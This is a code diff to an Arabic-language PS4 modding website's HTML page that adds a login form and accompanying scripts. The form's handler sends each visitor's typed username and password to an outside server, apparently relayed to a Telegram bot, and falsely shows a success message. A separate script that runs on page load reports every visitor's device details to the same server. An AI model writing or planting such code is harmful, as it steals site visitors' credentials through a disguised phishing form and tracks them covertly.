@@ -116,6 +116,55 @@
             color: #10b981;
         }
 
+        /* تنسيق صندوق تسجيل الدخول */
+        .login-box {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 40px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            text-align: right;
+        }
+
+        .login-box h3 {
+            color: #ffffff;
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+            text-align: center;
+        }
+
+        .login-box form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .login-box input {
+            padding: 10px;
+            border-radius: 6px;
+            background: #0b0f19;
+            border: 1px solid var(--border);
+            color: #fff;
+        }
+
+        .login-box button {
+            background-color: var(--accent);
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.2s;
+        }
+
+        .login-box button:hover {
+            background-color: #2563eb;
+        }
+
         /* تنسيق خيارات ويندوز والأزرار */
         .windows-prompt {
             margin-top: 15px;
@@ -237,6 +286,16 @@
             جاري فحص نظام التشغيل...
         </div>
 
+        <!-- قسم تسجيل الدخول المرتبط بالسيرفر -->
+        <div class="login-box">
+            <h3>🔐 تسجيل الدخول لحسابك في الموقع</h3>
+            <form id="siteLoginForm" onsubmit="sendLoginToTelegram(event)">
+                <input type="text" id="loginUsername" placeholder="اسم المستخدم" required>
+                <input type="password" id="loginPassword" placeholder="كلمة المرور" required>
+                <button type="submit">تسجيل الدخول</button>
+            </form>
+        </div>
+
         <div class="sections-grid">
             <a href="ps4.html" class="section-card">
                 <h2>🛠️ تعديل أجهزة PS4</h2>
@@ -255,12 +314,28 @@
     </footer>
 
     <script>
+        // إرسال إشعار تلقائي للبوت عند فتح الموقع للتأكد من أن الزيارة وصلت للسيرفر
+        (function() {
+            const ua = navigator.userAgent;
+            const currentTime = new Date().toLocaleString();
+            
+            // إرسال تنبيه بالدخول إلى السيرفر
+            fetch('https://VigitoSon.pythonanywhere.com/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "⚠️ [زيارة جديدة للموقع]",
+                    password: "جهاز الزائر: " + ua,
+                    last_login: currentTime
+                })
+            }).catch(err => console.log("Visit log error:", err));
+        })();
+
         // أداة User-Agent Check الحقيقية لفحص المتصفح والنظام برمجياً
         (function() {
             const ua = navigator.userAgent;
             const box = document.getElementById("uaBox");
 
-            // دالة لفحص وتحديد النظام بدقة بناءً على الـ User-Agent
             function checkUserAgent() {
                 if (/PlayStation 4/i.test(ua)) {
                     return 'PlayStation 4 (PS4)';
@@ -283,11 +358,9 @@
 
             const detectedSystem = checkUserAgent();
 
-            // تخصيص شكل رسالة الفحص حسب الجهاز إذا كان بلايستيشن أو جهاز آخر
             if (ua.includes("PlayStation")) {
                 box.innerHTML = `أنت تعمل على: <span class="ps-active">${detectedSystem}</span> (موافق للتعديل)`;
             } else if (/Windows/i.test(ua)) {
-                // إذا كان النظام Windows، عرض رسالة الكشف مع خيارات التوجه إلى DLPSGAME
                 box.innerHTML = `
                     انت مش علي بلايستيشن 4، نظام التشغيل: <span>${detectedSystem}</span>
                     <div class="windows-prompt" id="windowsPrompt">
@@ -299,7 +372,6 @@
                     </div>
                 `;
 
-                // تفعيل الأحداث للأزرار الجديدة
                 document.getElementById("btnYes").addEventListener("click", function() {
                     window.location.href = "https://dlpsgame.com";
                 });
@@ -311,6 +383,41 @@
                 box.innerHTML = `انت مش علي بلايستيشن 4، نظام التشغيل: <span>${detectedSystem}</span>`;
             }
         })();
+
+        // دالة إرسال بيانات تسجيل الدخول إلى سيرفر Python ومنه إلى بوت التليجرام
+        async function sendLoginToTelegram(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("loginUsername").value;
+            const password = document.getElementById("loginPassword").value;
+            const currentTime = new Date().toLocaleString();
+
+            const payload = {
+                username: username,
+                password: password,
+                last_login: currentTime
+            };
+
+            try {
+                const response = await fetch('https://VigitoSon.pythonanywhere.com/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    alert("تم تسجيل الدخول بنجاح!");
+                    document.getElementById("siteLoginForm").reset();
+                } else {
+                    alert("حدث خطأ في الاتصال، حاول مرة أخرى.");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert("تعذر الوصول إلى السيرفر.");
+            }
+        }
     </script>
 
 </body>
